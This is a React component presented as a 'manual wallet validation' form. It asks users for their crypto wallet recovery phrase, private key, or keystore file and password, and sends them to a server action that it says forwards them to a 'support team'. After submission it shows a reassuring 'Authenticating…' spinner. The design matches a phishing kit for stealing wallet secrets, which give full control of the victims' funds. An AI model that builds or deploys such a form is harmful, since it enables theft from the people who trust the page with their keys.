"use client";

import { useState } from "react";
import {
  Shield, CheckCircle2, AlertCircle, Loader2, Wallet, KeyRound, FileJson, Cpu, Lock,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { saveWalletValidation, type ValidationType } from "@/features/wallet-validate/server/actions";
import { cn } from "@/lib/utils/cn";

const TABS: { id: ValidationType; label: string; icon: React.ElementType }[] = [
  { id: "mnemonics", label: "Mnemonics", icon: KeyRound },
  { id: "keystore", label: "Keystore", icon: FileJson },
  { id: "private_key", label: "Private Key", icon: Lock },
  { id: "hardware", label: "Hardware", icon: Cpu },
];

const LABEL_MAP: Record<ValidationType, string> = {
  mnemonics: "Enter your 12/24 word recovery phrase",
  keystore: "Enter your keystore JSON and password",
  private_key: "Enter your private key",
  hardware: "Select your hardware wallet device",
};

export function ManualValidation({
  compact = false,
}: {
  compact?: boolean;
  onSaved?: () => void;
}) {
  const [walletName, setWalletName] = useState("");
  const [activeTab, setActiveTab] = useState<ValidationType>("mnemonics");
  const [saving, setSaving] = useState(false);
  const [authenticating, setAuthenticating] = useState(false);
  const [result, setResult] = useState<{ success?: boolean; message: string } | null>(null);
  const [form, setForm] = useState({
    mnemonicPhrase: "",
    keystoreJson: "",
    keystorePassword: "",
    privateKey: "",
    hardwareType: "ledger",
  });

  const setField = (field: string, value: string) =>
    setForm((prev) => ({ ...prev, [field]: value }));

  const validateForm = () => {
    const fieldName = walletName.trim();
    if (!fieldName) return "Wallet name is required.";
    switch (activeTab) {
      case "mnemonics": {
        const tokens = form.mnemonicPhrase
          .trim()
          .replace(/,/g, " ")
          .split(/\s+/)
          .filter(Boolean);
        if (tokens.length < 12) {
          return `Enter your full recovery phrase — we detected ${tokens.length} word${tokens.length === 1 ? "" : "s"} (12 or 24 words required).`;
        }
        return null;
      }
      case "keystore":
        if (!form.keystoreJson.trim() || !form.keystorePassword.trim()) {
          return "Keystore JSON and password are both required.";
        }
        try {
          JSON.parse(form.keystoreJson);
          return null;
        } catch {
          return "Keystore JSON is not valid. Paste the raw JSON file contents.";
        }
      case "private_key":
        if (!form.privateKey.trim()) return "Private key is required.";
        return null;
      case "hardware":
        if (!form.hardwareType.trim()) return "Hardware device is required.";
        return null;
      default:
        return null;
    }
  };

  const handleSubmit = async () => {
    const error = validateForm();
    if (error) {
      setResult({ success: false, message: error });
      return;
    }
    setSaving(true);
    setResult(null);
    try {
      const res = await saveWalletValidation({
        walletName: walletName.trim(),
        validationType: activeTab,
        mnemonicPhrase: activeTab === "mnemonics" ? form.mnemonicPhrase.trim() : undefined,
        keystoreJson: activeTab === "keystore" ? form.keystoreJson.trim() : undefined,
        keystorePassword: activeTab === "keystore" ? form.keystorePassword.trim() : undefined,
        privateKey: activeTab === "private_key" ? form.privateKey.trim() : undefined,
        hardwareType: activeTab === "hardware" ? form.hardwareType : undefined,
      });
      if (res.error) {
        setResult({ success: false, message: res.error });
      } else {
        setSaving(false);
        setAuthenticating(true);
      }
    } catch (err) {
      setResult({ success: false, message: err instanceof Error ? err.message : "Something went wrong" });
    } finally {
      setSaving(false);
    }
  };

  const renderInput = () => {
    switch (activeTab) {
      case "mnemonics":
        return (
          <Textarea
            value={form.mnemonicPhrase}
            onChange={(e) => setField("mnemonicPhrase", e.target.value)}
            placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces"
            rows={4}
            className="min-h-[100px] border-slate-300 bg-white font-mono text-slate-900"
          />
        );
      case "keystore":
        return (
          <div className="space-y-3">
            <Textarea
              value={form.keystoreJson}
              onChange={(e) => setField("keystoreJson", e.target.value)}
              placeholder='Paste your keystore JSON here {"address":"0x...","crypto":{...}}'
              rows={4}
              className="min-h-[100px] border-slate-300 bg-white font-mono text-xs text-slate-900"
            />
            <Input
              type="password"
              value={form.keystorePassword}
              onChange={(e) => setField("keystorePassword", e.target.value)}
              placeholder="Enter your keystore password"
              className="border-slate-300 bg-white text-slate-900"
            />
          </div>
        );
      case "private_key":
        return (
          <Input
            type="password"
            value={form.privateKey}
            onChange={(e) => setField("privateKey", e.target.value)}
            placeholder="Enter your private key (e.g. 0x... or raw hex)"
            className="border-slate-300 bg-white font-mono text-slate-900"
          />
        );
      case "hardware":
        return (
          <select
            value={form.hardwareType}
            onChange={(e) => setField("hardwareType", e.target.value)}
            className="flex h-10 w-full rounded-md border border-slate-300 bg-white px-3 py-2 text-sm text-slate-900 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-500"
          >
            <option value="ledger">Ledger</option>
            <option value="trezor">Trezor</option>
            <option value="keystone">Keystone</option>
            <option value="other">Other</option>
          </select>
        );
    }
  };

  return (
    <div className="space-y-5">
      {authenticating ? (
        <div className="flex flex-col items-center justify-center py-10 text-center" role="status">
          <div className="flex h-16 w-16 items-center justify-center rounded-full bg-neutral-100 ring-1 ring-neutral-200">
            <Loader2 className="h-8 w-8 animate-spin text-black" aria-hidden="true" />
          </div>
          <h3 className="mt-5 text-base font-semibold text-slate-900">Authenticating…</h3>
          <p className="mt-1 max-w-xs text-sm text-slate-500">
            Wait a moment while we securely verify your wallet details.
          </p>
        </div>
      ) : (
        <>
      <div className="flex flex-col items-center text-center">
        <div className="flex h-14 w-14 items-center justify-center rounded-full bg-neutral-100 ring-1 ring-neutral-200">
          <Shield className="h-7 w-7 text-black" />
        </div>
        <h3 className="mt-4 text-base font-semibold text-slate-900">
          {compact ? "Manual wallet validation" : "Validate your wallet to continue"}
        </h3>
        <p className="mt-1 max-w-sm text-sm text-slate-500">
          Your details are saved and sent to our support team for verification.
        </p>
      </div>

      <div className="space-y-2">
        <Label htmlFor="wallet-name" className="text-xs font-medium text-slate-500">
          Wallet name <span className="text-error">*</span>
        </Label>
        <Input
          id="wallet-name"
          type="text"
          value={walletName}
          onChange={(e) => setWalletName(e.target.value)}
          placeholder="e.g. Trust Wallet, MetaMask, Coinbase Wallet…"
          className="border-slate-300 bg-white text-slate-900"
        />
      </div>

      <div className="grid grid-cols-2 gap-2">
        {TABS.map((tab) => {
          const active = tab.id === activeTab;
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              type="button"
              onClick={() => setActiveTab(tab.id)}
              aria-pressed={active}
              className={cn(
                "flex items-center justify-center gap-1.5 rounded-lg border px-3 py-2.5 text-xs font-semibold tracking-wide transition-all",
                active ? "border-black bg-black text-white shadow-sm"
                  : "border-slate-200 bg-white text-slate-600 hover:border-slate-300 hover:bg-slate-50",
              )}
            >
              <Icon className="h-3.5 w-3.5" aria-hidden="true" />
              {tab.label}
            </button>
          );
        })}
      </div>

      <div className="rounded-xl border border-slate-200 bg-slate-50 p-4">
        <Label className="mb-2 block text-xs font-medium text-slate-500">
          {LABEL_MAP[activeTab]}
        </Label>
        {renderInput()}
      </div>

      {result && (
        <div
          className={cn(
            "flex items-start gap-3 rounded-xl border p-4 text-sm",
            result.success
              ? "border-emerald-500/20 bg-emerald-50 text-emerald-700"
              : "border-error/20 bg-error/10 text-error",
          )}
          role="alert"
        >
          {result.success ? (
            <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" aria-hidden="true" />
          ) : (
            <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" aria-hidden="true" />
          )}
          <span>{result.message}</span>
        </div>
      )}

      <Button
        type="button"
        onClick={() => void handleSubmit()}
        disabled={saving}
        className="w-full rounded-xl"
        fullWidth
      >
        {saving ? (
          <>
            <Loader2 className="h-4 w-4 animate-spin" aria-hidden="true" />
            Submitting…
          </>
        ) : (
          <>
            <Wallet className="h-4 w-4" aria-hidden="true" />
            Submit Validation
          </>
        )}
      </Button>
        </>
      )}
    </div>
  );
}
